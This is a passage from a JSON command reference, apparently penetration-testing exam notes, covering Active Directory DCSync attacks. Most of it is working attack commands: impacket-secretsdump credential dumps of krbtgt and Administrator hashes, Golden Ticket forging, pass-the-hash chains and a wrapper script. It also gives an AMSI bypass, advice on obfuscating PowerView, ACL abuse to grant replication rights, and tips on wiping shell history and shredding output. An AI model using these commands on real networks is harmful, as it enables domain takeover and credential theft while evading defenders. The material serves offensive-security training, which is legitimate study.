or password\n\n3.\n\n**DCSYNC** (from Kali - THIS COMMAND):\n   impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:password@10.10.10.70'\n   Result:\nkrbtgt NTLM hash (for Golden Tickets), Administrator hash (for persistence)\n\n4.\n\n**PERSISTENCE** (from Kali):\n   - Golden Ticket:\nimpacket-ticketer -nthash <krbtgt_hash> -domain corp.com -domain-sid S-1-5-21-XXX fakeadmin\n   - Pass-the-hash:\nimpacket-wmiexec -hashes :NTLM_HASH corp.com/Administrator@<target>\n   Result:\nPersistent domain-wide access\n\nALL FROM KALI - NO WINDOWS ACCESS NEEDED.\n\nCOMMAND VARIATIONS:\n# Basic DCSync (single user with password auth):\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:Pass123!@10.10.10.70'\n\n# DCSync with Pass-the-Hash:\nimpacket-secretsdump -just-dc-user Administrator -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/admin@10.10.10.70\n\n# DCSync krbtgt for Golden Ticket:\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:Pass123!@10.10.10.70'\n\n# DCSync all users (full domain dump):\nimpacket-secretsdump -just-dc-ntlm 'corp.com/admin:Pass123!@10.10.10.70'\n\n# DCSync with Kerberos authentication (if you have TGT):\nexport KRB5CCNAME=/tmp/admin.ccache\nimpacket-secretsdump -k -no-pass -just-dc-user Administrator corp.com/admin@DC1.corp.com\n\n# DCSync and save to file:\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:Pass123!@10.10.10.70' > dcsync_output.txt\n\n# DCSync specific computer account (for Silver tickets):\nimpacket-secretsdump -just-dc-user 'WEBSERVER$' 'corp.com/admin:Pass123!@10.10.10.70'\n\nOUTPUT PARSING AUTOMATION:\n# Extract NTLM hash only:\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@10.10.10.70' 2>/dev/null | grep ':500:' | cut -d ':' -f 4\n\n# Extract Kerberos AES256 key:\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@10.10.10.70' 2>/dev/null | grep 'aes256' | awk '{print $NF}'\n\n# Batch DCSync multiple users:\nfor user in Administrator krbtgt jeff dave; do\n  echo \"[+] DCSync $user\"\n  impacket-secretsdump -just-dc-user $user 'corp.com/admin:pass@10.10.10.70' | grep \"$user\"\ndone\n\n# Save all hashes to file:\nimpacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@10.10.10.70' 2>/dev/null | grep ':::' > all_hashes.txt\n\nINTEGRATION WITH OTHER IMPACKET TOOLS:\n# Chain:\nDCSync \u2192 Extract hash \u2192 Pass-the-hash \u2192 Remote code execution\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@10.10.10.70' | grep ':500:' | cut -d ':' -f 4 > admin_hash.txt\nADMIN_HASH=$(cat admin_hash.txt)\nimpacket-wmiexec -hashes :$ADMIN_HASH corp.com/Administrator@10.10.10.70\n\n# Chain:\nDCSync krbtgt \u2192 Golden Ticket \u2192 Access any machine\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@10.10.10.70' | grep 'krbtgt' | cut -d ':' -f 4 > krbtgt_hash.txt\nKRBTGT_HASH=$(cat krbtgt_hash.txt)\nimpacket-ticketer -nthash $KRBTGT_HASH -domain corp.com -domain-sid S-1-5-21-XXX -user-id 500 fakeadmin\nexport KRB5CCNAME=fakeadmin.ccache\nimpacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com\n\nCOMPARISON:\nIMPACKET VS MIMIKATZ DCSYNC:\n| Feature | impacket-secretsdump | Mimikatz lsadump::dcsync |\n|---------|---------------------|---------------------------|\n| Platform | Linux (Kali) | Windows |\n| Installation | Pre-installed Kali | Manual download/transfer |\n| AV/EDR risk | None (runs remotely) | High (executes on target) |\n| Output format | domain\\user:RID:LM:NTLM:::\n| Verbose with metadata |\n| Authentication | Password, hash, Kerberos | Same |\n| Batch operations | Easy (bash loops) | Manual (repeat commands) |\n| Kerberos manipulation | Limited | Extensive (PTT, ticket forge) |\n| pentest fit | **Excellent** | Good (if Windows access) |\n\nTIME ESTIMATES FOR PRACTICAL:\n- Single user DCSync:\n2-10 seconds (network latency dependent)\n- Full domain DCSync (-just-dc-ntlm):\n30-120 seconds (depends on user count:\n50 users ~30s, 500 users ~2min)\n- Hash extraction and formatting:\n<5 seconds (automated with cut/awk)\n- TOTAL (DA credentials \u2192 krbtgt hash):\n**<1 minute**\n\nIf secretsdump hangs >30 seconds:\nCheck network connectivity, try alternative DC, or use Mimikatz from Windows\n\nDETECTION (identical to Mimikatz DCSync):\n- Event ID 4662 on DC (same replication events)\n- Source IP is Kali Linux (non-Windows, non-DC)\n- OPSEC identical to Mimikatz (both use DRSUAPI)\n- Blue team cannot distinguish between impacket and Mimikatz DCSync (protocol-level identical)\n\nOPSEC CONSIDERATIONS:\n1.\n\n**Use -just-dc-user instead of -just-dc-ntlm**:\nTargeted extraction is faster and generates fewer logs\n2.\n\n**Pass-the-hash instead of password**:\nAvoid cleartext password in command history\n   ```bash\n   # Clear history after:\n   history -c\n   # Or use:\n   HISTFILE=/dev/null impacket-secretsdump ...\n   ```\n3.\n\n**Save output to temp file**:\n`impacket-secretsdump ...\n\n> /tmp/dcsync.txt` then `shred -u /tmp/dcsync.txt` after use\n4.\n\n**Batch DCSync**:\nIf dumping multiple users, space out requests (don't hammer DC with 100 requests in 10 seconds)\n\nCOMMON MISTAKES TO AVOID:\n1.\n\n\u274c Forgetting quotes around authentication string:\n   WRONG:\nimpacket-secretsdump ...\n\ncorp.com/admin:Pass123!@10.10.10.70\n   RIGHT:\nimpacket-secretsdump ...\n\n'corp.com/admin:Pass123!@10.10.10.70'\n\n2.\n\n\u274c Using DOMAIN\\username format:\n   WRONG:\n'CORP\\admin:pass@10.10.10.70'\n   RIGHT:\n'corp.com/admin:pass@10.10.10.70' OR 'CORP/admin:pass@10.10.10.70'\n\n3.\n\n\u274c Not verifying Domain Admin privileges first:\n   TEST:\ncrackmapexec smb 10.10.10.70 -u admin -p Pass123! --groups\n   VERIFY:\nOutput should show \"Domain Admins\" group\n\n4.\n\n\u274c Using wrong flag:\n   WRONG:\n-just-dc-user (dumps single user via DCSync) \u2713\n   WRONG:\n-just-user (doesn't exist)\n   WRONG:\n-user (doesn't exist)\n\n5.\n\n\u274c Typo in target username:\n   ERROR:\n'[-] User 'Adminstrator' not found'\n   FIX:\nAdministrator (correct spelling)\n\nTROUBLESHOOTING CHECKLIST:\n- [ ] Domain Admin credentials verified (crackmapexec --groups shows 'Domain Admins')\n- [ ] DC is reachable (ping, smbclient, ldapsearch)\n- [ ] Authentication string properly quoted ('domain/user:pass@dc')\n- [ ] Special characters in password escaped or single-quoted\n- [ ] Target username spelled correctly (case-insensitive but must be exact)\n- [ ] Correct flag used (-just-dc-user for single user)\n- [ ] Network routing configured (VPN active, pivoting setup)\n\nNEXT STEPS AFTER DCSYNC:\n1.\n\n**Extract NTLM hash**:\ngrep output, cut field 4\n2.\n\n**Test hash validity**:\ncrackmapexec smb <target> -u <user> -H <hash>\n3.\n\n**Crack hash (optional)**:\nhashcat -m 1000 hash.txt rockyou.txt\n4.\n\n**Use for lateral movement**:\nimpacket-wmiexec -hashes :<hash> domain/user@target\n5.\n\n**Create Golden Ticket (if krbtgt)**:\nimpacket-ticketer -nthash <krbtgt_hash> ...\n6.\n\n**Document all hashes**:\nStore in creds.txt for reference\n\nFINAL PRACTICAL TIP:\nCreate a DCSync alias in your .bashrc for quick execution:\n```bash\nalias dcsync='impacket-secretsdump -just-dc-user'\n# Usage:\ndcsync krbtgt 'corp.com/admin:pass@10.10.10.70'\n```\n\nOr create a wrapper script:\n```bash\n#!/bin/bash\n# dcsync.sh - Quick DCSync wrapper\nUSER=$1\nDOMAIN=$2\nADMIN=$3\nPASS=$4\nDC=$5\nimpacket-secretsdump -just-dc-user $USER \"$DOMAIN/$ADMIN:$PASS@$DC\" 2>/dev/null | grep \"::\"\n\n# Usage:\n./dcsync.sh krbtgt corp.com administrator Pass123! 10.10.10.70\n```\n\nPRACTICE BEFORE EXAM:\n1.\n\nMemorize syntax:\nimpacket-secretsdump -just-dc-user <user> '<domain>/<admin>:<pass>@<dc>'\n2.\n\nPractice special character escaping (!, $, @)\n3.\n\nPractice output parsing (cut, awk, grep)\n4.\n\nChain with other impacket tools (wmiexec, psexec, ticketer)\n5.\n\nTroubleshoot permission errors (identify when you're NOT domain admin)",
      "alternatives": [
        "ad-dcsync-mimikatz-single-user",
        "ad-dcsync-impacket-secretsdump-user"
      ],
      "next_steps": [
        "hashcat-crack",
        "crackmapexec-smb-spray"
      ],
      "prerequisites": [
        "ad-dcsync-check-domain-admins",
        "crackmapexec-validate-admin"
      ],
      "filled_example": "impacket-secretsdump -just-dc-user <Administrator> '<corp.com>/<administrator>:<Password123!>@<10.10.10.70>'"
    },
    {
      "id": "ad-dcsync-check-permissions",
      "name": "Check DCSync Replication Permissions",
      "category": "enumeration",
      "subcategory": "privilege-enumeration",
      "command": "Get-DomainObjectAcl -DistinguishedName 'DC=<DOMAIN>,DC=<TLD>' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}",
      "description": "Verify if the current user or specified account has the required ACL permissions to perform DCSync attacks (Replicating Directory Changes rights on the domain object).",
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "PRIVILEGE_ENUMERATION",
        "POWERVIEW",
        "ACL_ENUMERATION"
      ],
      "variables": [
        {
          "name": "DOMAIN",
          "description": "Domain component of the Distinguished Name (e.g., 'corp' for corp.com)",
          "example": "corp",
          "required": true
        },
        {
          "name": "TLD",
          "description": "Top-level domain component (e.g., 'com' for corp.com)",
          "example": "com",
          "required": true
        }
      ],
      "flag_explanations": {
        "Get-DomainObjectAcl": "PowerView function that retrieves Access Control Lists (ACLs) for Active Directory objects. Returns discretionary access control entries (DACEs) showing WHO has WHAT permissions on an object. For DCSync validation, we query the domain root object's ACL to see who has replication rights. Requires PowerView module (Import-Module PowerView.ps1). ALTERNATIVES: Get-Acl (native PowerShell but output less readable), dsacls.exe (Windows built-in, cmd-line tool).",
        "-DistinguishedName 'DC=corp,DC=com'": "Specifies the Active Directory object to query ACLs for. Distinguished Name (DN) is the full LDAP path to an object. Format: DC=<domain>,DC=<tld> for domain root. EXAMPLES:\n- Single domain: DC=corp,DC=com\n- Subdomain: DC=subdomain,DC=corp,DC=com\n- With OUs: OU=Servers,DC=corp,DC=com\n\nFor DCSync, we MUST query the domain root object (DC=corp,DC=com) because replication rights are granted at domain level, not OU level. GET DN AUTOMATICALLY: (Get-ADDomain).DistinguishedName OR $((Get-Domain).distinguishedname) (PowerView).",
        "-ResolveGUIDs": "Translates ObjectType and ObjectAceType GUIDs into human-readable names. WITHOUT this flag, output shows GUIDs like {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (meaningless). WITH -ResolveGUIDs, shows 'DS-Replication-Get-Changes' (actionable). PERFORMANCE: Slower (requires additional LDAP queries to schema), but essential for analysis. FOR DCSYNC, KEY GUIDS:\n- 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes\n- 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 = DS-Replication-Get-Changes-All\nBOTH are required for full DCSync capability.",
        "? {($_.ObjectAceType -match 'Replication')}": "PowerShell filter (Where-Object shorthand: ?) to show ONLY ACEs related to replication. $_.ObjectAceType is the permission type (e.g., 'DS-Replication-Get-Changes'). -match 'Replication' uses regex to find any permission containing 'Replication'. WHY FILTER: Domain root object has 100+ ACEs (Domain Admins, Enterprise Admins, Backup Operators, etc.). Filtering shows only DCSync-relevant permissions (Replication-related). ALTERNATIVE FILTERS:\n- ? {$_.ObjectAceType -eq 'DS-Replication-Get-Changes'} (exact match)\n- ? {$_.ObjectAceType -like '*Replication*'} (wildcard match)",
        "$_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME)": "Filters ACEs to show ONLY permissions granted to the current user. $_.SecurityIdentifier is the SID of the principal (user/group) who has the permission. ConvertTo-SID $env:USERNAME converts current username to SID. -match compares SIDs. RESULT: Shows if YOU (current user) have replication rights. TO CHECK SPECIFIC USER: Replace $env:USERNAME with 'adminuser'. TO CHECK SPECIFIC GROUP: ConvertTo-SID 'Domain Admins'. TO SEE ALL PRINCIPALS: Remove this filter (shows everyone with replication rights, useful for attack planning)."
      },
      "success_indicators": [
        "Output shows ACE entries with ObjectAceType 'DS-Replication-Get-Changes'",
        "Output shows ACE entries with ObjectAceType 'DS-Replication-Get-Changes-All'",
        "SecurityIdentifier matches current user's SID or their group SIDs",
        "ActiveDirectoryRights includes 'ExtendedRight' (required for replication)",
        "Both 'Get-Changes' AND 'Get-Changes-All' present (both needed for full DCSync)",
        "Multiple ACEs may appear if user is in multiple groups with replication rights"
      ],
      "failure_indicators": [
        "No output / empty result - Current user LACKS replication rights (cannot DCSync)",
        "Only 'DS-Replication-Get-Changes' present (missing 'Get-Changes-All') - Partial rights, DCSync may fail",
        "ERROR: Get-DomainObjectAcl not recognized - PowerView not imported",
        "ERROR: Cannot find path - Wrong Distinguished Name format or domain unreachable",
        "Access denied - Rare (standard users can query ACLs), may indicate hardened environment"
      ],
      "troubleshooting": {
        "PowerView not recognized": "DIAGNOSIS: PowerView module not loaded in current PowerShell session.\n\nSOLUTIONS:\n1. Import PowerView:\n   Import-Module C:\\Tools\\PowerView.ps1\n   # OR dot-source:\n   . .\\PowerView.ps1\n\n2. Download PowerView (if missing):\n   wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -OutFile PowerView.ps1\n   Import-Module .\\PowerView.ps1\n\n3. Bypass AMSI (if blocked):\n   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n   Import-Module .\\PowerView.ps1\n\n4. Use obfuscated PowerView:\n   - Rename functions (Get-DomainObjectAcl \u2192 Get-ObjectPermission)\n   - Use Invoke-Obfuscation tool\n   - Download pre-obfuscated version\n\n5. Alternative without PowerView:\n   dsacls.exe \"DC=corp,DC=com\" | findstr Replication\n   # Shows raw ACL data (harder to parse but works)",
        "No results but user should have permissions": "DIAGNOSIS: Filter is too restrictive or user has inherited permissions via group membership.\n\nSOLUTIONS:\n\n1. CHECK GROUP MEMBERSHIPS:\n   whoami /groups\n   # Look for: Domain Admins, Enterprise Admins, Administrators\n   # These groups have replication rights by default\n\n2. REMOVE USER FILTER (show ALL principals with replication rights):\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'}\n   # Output shows ALL users/groups with replication rights\n   # Check if your groups are listed\n\n3. CHECK SPECIFIC GROUP:\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'Domain Admins'))}\n   # Replace 'Domain Admins' with your group\n\n4. VERIFY INHERITED PERMISSIONS:\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'} | Select SecurityIdentifier,ObjectAceType,ActiveDirectoryRights\n   # Shows SIDs - manually match against your user SID: whoami /user\n\n5. DIRECT ACL QUERY (verify PowerView results):\n   $acl = Get-Acl -Path 'AD:\\DC=corp,DC=com'\n   $acl.Access | ? {$_.ObjectType -like '*Replication*'}\n   # Native PowerShell alternative (GUIDs not resolved)",
        "Missing 'DS-Replication-Get-Changes-All' (only have 'Get-Changes')": "DIAGNOSIS: Partial replication rights. BOTH permissions are required for full DCSync.\n\nREQUIRED PERMISSIONS FOR DCSYNC:\n1. DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n   - Allows replication of non-sensitive data\n2. DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n   - Allows replication of password hashes and sensitive attributes\n3. (Optional) DS-Replication-Get-Changes-In-Filtered-Set (GUID: 89e95b76-444d-4c62-991a-0facbeda640c)\n   - Required for Read-Only Domain Controllers (RODC) replication\n\nWITHOUT 'Get-Changes-All':\n- DCSync will FAIL with 'Access denied' or return incomplete data\n- You can replicate user objects but NOT password hashes\n\nSOLUTIONS:\n1. Verify user is Domain Admin: net group \"Domain Admins\" /domain\n   - Domain Admins have BOTH permissions by default\n2. Check if permissions were custom-assigned (delegation):\n   Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME)} | Select ObjectAceType\n   - Should show BOTH 'Get-Changes' AND 'Get-Changes-All'\n3. If missing 'Get-Changes-All': You cannot DCSync. ALTERNATIVES:\n   - Escalate to Domain Admin (different attack path)\n   - Get local admin on DC and dump NTDS.dit directly\n   - Use credential dumping on DC (LSASS, registry hives)",
        "Checking if specific compromised account can DCSync": "SCENARIO: You've obtained credentials for 'backupuser' account. Check if it can DCSync BEFORE attempting (avoid detection from failed DCSync attempts).\n\nCHECK SPECIFIC USER:\nGet-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'backupuser'))}\n\nEXPECTED OUTPUT:\nObjectDN: DC=corp,DC=com\nObjectAceType: DS-Replication-Get-Changes\nSecurityIdentifier: S-1-5-21-...-1234 (backupuser's SID)\n---\nObjectAceType: DS-Replication-Get-Changes-All\nSecurityIdentifier: S-1-5-21-...-1234\n\nIf BOTH permissions present: backupuser can DCSync\nIf MISSING or ONLY ONE present: backupuser CANNOT DCSync\n\nALTERNATIVE CHECK (from Linux/Kali):\n# Attempt DCSync - if permission error, user cannot DCSync:\nimpacket-secretsdump -just-dc-user krbtgt corp.com/backupuser:password@10.10.10.70\n# Error: 'RemoteOperations failed: DCERPC Runtime Error' = No replication rights\n# Success: Credentials dumped = Has replication rights"
      },
      "notes": "METHODOLOGY - DCSYNC PERMISSION VALIDATION:\nBEFORE attempting DCSync attacks, VALIDATE permissions to avoid:\n1.\n\n**Detection**:\nFailed DCSync attempts generate Event ID 4662 (suspicious if repeated)\n2.\n\n**Time waste**:\nTroubleshooting permission errors during exam wastes precious time\n3.\n\n**Account lockout**:\nRepeated failures may trigger security alerts or account restrictions\n\nWHEN TO CHECK DCSYNC PERMISSIONS:\n1.\n\n**After obtaining Domain Admin**:\n   - Verify DA account actually works\n   - Confirm no unusual ACL restrictions\n   - Validate before proceeding with Golden Ticket workflow\n\n2.\n\n**When enumerating privilege escalation paths**:\n   - Identify which accounts can DCSync (besides default DAs)\n   - Discover custom delegated permissions (backup operators, etc.)\n   - Map attack graph:\nUser A \u2192 DCSync \u2192 krbtgt hash \u2192 Golden Ticket\n\n3.\n\n**After compromising service account**:\n   - Some service accounts have replication rights (backup services, monitoring tools)\n   - Verify before attempting DCSync with service account credentials\n\n4.\n\n**During ACL abuse attacks**:\n   - If you have WriteDACL on domain object, you can GRANT yourself replication rights\n   - Validate after granting rights to confirm success\n\nDEFAULT GROUPS WITH REPLICATION RIGHTS:\nBY DEFAULT, these groups have DS-Replication-Get-Changes + DS-Replication-Get-Changes-All:\n1.\n\n**Domain Admins** (most common):\n   - Default administrative group for domain\n   - RID:\n512 (S-1-5-21-DOMAIN-DOMAIN-DOMAIN-512)\n   - Check membership:\nnet group \"Domain Admins\" /domain\n\n2.\n\n**Enterprise Admins** (forest-wide):\n   - Exists only in forest root domain\n   - Has admin rights across ALL domains in forest\n   - Check membership:\nnet group \"Enterprise Admins\" /domain\n\n3.\n\n**Administrators** (built-in):\n   - Built-in local administrators group\n   - Check membership:\nnet localgroup Administrators\n\n4.\n\n**Domain Controllers** (computer accounts):\n   - All DC machine accounts (DC1$, DC2$, etc.)\n   - Used for legitimate DC-to-DC replication\n\nCUSTOM DELEGATED PERMISSIONS (less common but possible):\n- **Backup Operators**:\nSometimes granted replication rights for backup software\n- **Monitoring accounts**:\nSIEM/monitoring tools may need replication access for auditing\n- **Specific service accounts**:\nCustom delegation for specific business needs\n\nDISCOVER CUSTOM DELEGATIONS:\nGet-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'} | Select SecurityIdentifier,ObjectAceType | Sort-Object -Unique\n# Shows ALL SIDs with replication rights\n# Convert SIDs to names:\nConvertFrom-SID <SID>\n\nMANUAL ALTERNATIVE (without PowerView):\nUSING DSACLS.EXE (Windows built-in):\ndsacls.exe \"DC=corp,DC=com\" | findstr /i replication\n\nOUTPUT EXAMPLE:\n  Allow CORP\\Domain Admins     DS-Replication-Get-Changes\n  Allow CORP\\Domain Admins     DS-Replication-Get-Changes-All\n  Allow CORP\\Enterprise Admins DS-Replication-Get-Changes\n  Allow CORP\\Enterprise Admins DS-Replication-Get-Changes-All\n\nINTERPRETATION:\n- 'Allow' = Permission granted (not 'Deny')\n- Principal (CORP\\Domain Admins) = Who has permission\n- Permission name = What they can do\n\nLOOK FOR YOUR USER/GROUPS:\ndsacls.exe \"DC=corp,DC=com\" | findstr /i \"adminuser\\|replication\"\n# Shows if user 'adminuser' has replication rights\n\nUSING NATIVE POWERSHELL (no PowerView):\n(Get-Acl -Path 'AD:\\DC=corp,DC=com').Access | ? {$_.ObjectType -like '*1131f6a*'} | Select IdentityReference,ActiveDirectoryRights\n# ObjectType GUID 1131f6a* matches replication permissions\n# Output shows IdentityReference (user/group) and their rights\n\nACL ABUSE - GRANTING DCSYNC PERMISSIONS:\nIF YOU HAVE WriteDACL PERMISSION on domain object, you can GRANT replication rights to any user:\n# Add DCSync permissions to user 'backupuser' (PowerView):\nAdd-DomainObjectAcl -TargetIdentity 'DC=corp,DC=com' -PrincipalIdentity 'backupuser' -Rights DCSync\n\n# ALTERNATIVELY (native PowerShell, more complex):\n$user = Get-ADUser backupuser\n$acl = Get-Acl -Path 'AD:\\DC=corp,DC=com'\n$sid = New-Object System.Security.Principal.SecurityIdentifier $user.SID\n# Add DS-Replication-Get-Changes\n$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')\n# Add DS-Replication-Get-Changes-All\n$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid,'ExtendedRight','Allow',([guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')\n$acl.AddAccessRule($ace1)\n$acl.AddAccessRule($ace2)\nSet-Acl -Path 'AD:\\DC=corp,DC=com' -AclObject $acl\n\nVALIDATE AFTER GRANTING:\nGet-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID 'backupuser'))}\n# Should show BOTH permissions now\n\nTIME ESTIMATES FOR PRACTICAL:\n- Check current user permissions:\n<10 seconds (if PowerView loaded)\n- Check specific user permissions:\n<10 seconds\n- List ALL principals with replication rights:\n<15 seconds\n- Grant DCSync permissions (ACL abuse):\n<30 seconds\n- Validate after granting:\n<10 seconds\n- TOTAL (permission check before DCSync):\n**<30 seconds**\n\nAlways validate before attempting DCSync - 30 seconds of checking saves 5-10 minutes of troubleshooting failed attempts.\n\nDETECTION AND OPSEC:\nACL ENUMERATION DETECTION:\n- Event ID 4662:\n\"An operation was performed on an object\" (DS Access)\n  - Object Type:\ndomain object (DC=corp,DC=com)\n  - Access mask:\nRead ACL\n- VOLUME MATTERS:\nSingle ACL query is normal, 100+ queries in 10 seconds is suspicious\n- OPSEC:\nQuery ACLs during enumeration phase (not immediately before DCSync)\n\nGRANTING REPLICATION RIGHTS DETECTION (if doing ACL abuse):\n- Event ID 5136:\n\"A directory service object was modified\"\n  - Attribute:\nntSecurityDescriptor (ACL modification)\n  - Value:\nAdded DS-Replication-Get-Changes[All]\n- Event ID 4662:\nACL modification on domain object\n- HIGH VISIBILITY:\nACL changes on domain root object are HIGH-PRIORITY ALERTS in mature environments\n- OPSEC:\nUse existing DA/EA account instead of granting rights (cleaner, less detectable)\n\nCOMMON PRACTICAL SCENARIO:\n1.\n\nCOMPROMISE DOMAIN USER:\n   impacket-GetNPUsers corp.com/ -dc-ip 10.10.10.70 -request\n   # AS-REP roast, obtain user 'testuser' hash\n\n2.\n\nCRACK HASH:\n   hashcat -m 18200 pete_hash.txt rockyou.txt\n   # Plaintext:\nPassword123\n\n3.\n\nVALIDATE PERMISSIONS:\n   crackmapexec smb 10.10.10.70 -u testuser -p Password123 --groups\n   # Output:\npete is NOT in Domain Admins (no DCSync capability)\n\n4.\n\nLATERAL MOVEMENT (find DA):\n   crackmapexec smb 10.10.10.0/24 -u testuser -p Password123 --local-auth --sam\n   # Dump SAM on multiple machines, find cached DA credentials\n\n5.\n\nOBTAIN DA CREDENTIALS:\n   # Found:\nadministrator:2892d26cdf84d7a70e2eb3b9f05c425e (NTLM hash)\n\n6.\n\nVALIDATE DA CAN DCSYNC:\n   crackmapexec smb 10.10.10.70 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e --groups\n   # Output:\nadministrator is in Domain Admins \u2713\n\n7.\n\nDCSYNC KRBTGT:\n   impacket-secretsdump -just-dc-user krbtgt -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@10.10.10.70\n   # Success:\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::\n8.\n\nGOLDEN TICKET:\n   # Use krbtgt hash for persistent access\n\nThe permission validation (step 6) confirms DA status BEFORE attempting DCSync, avoiding failed attempts and detection.\n\nFINAL PRACTICAL TIPS:\n1.\n\n**Always check permissions first**:\n30 seconds of validation saves 10 minutes of troubleshooting\n2.\n\n**Verify group membership**:\nwhoami /groups OR crackmapexec --groups\n3.\n\n**Know default groups**:\nDomain Admins = DCSync capability (no need to check ACLs)\n4.\n\n**Custom permissions are rare**:\nIn labs, DA/EA are the typical DCSync accounts\n5.\n\n**If check fails**:\nVerify PowerView is loaded, check DN format, ensure network connectivity\n6.\n\n**Document findings**:\nCreate notes:\n\"User X can DCSync:\nYES/NO\"\n\nPRACTICE EXERCISES:\n1.\n\nLoad PowerView and run permission check on lab domain\n2.\n\nCheck permissions for your user, Domain Admins group, and Enterprise Admins\n3.\n\nList ALL principals with replication rights (remove user filter)\n4.\n\nPractice converting SIDs to usernames (ConvertFrom-SID)\n5.\n\nCompare PowerView results with dsacls.exe output (verify consistency)\n6.\n\nTime yourself:\nFrom PowerShell launch to permission check complete (<30 seconds target)",
      "alternatives": [],
      "next_steps": [
        "ad-dcsync-mimikatz-single-user",
        "ad-dcsync-impacket-secretsdump-user"
      ],
      "prerequisites": [
        "ad-dcsync-check-domain-admins"
      ],
      "filled_example": "Get-DomainObjectAcl -DistinguishedName 'DC=<corp>,DC=<com>' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}"
    }
  ]
}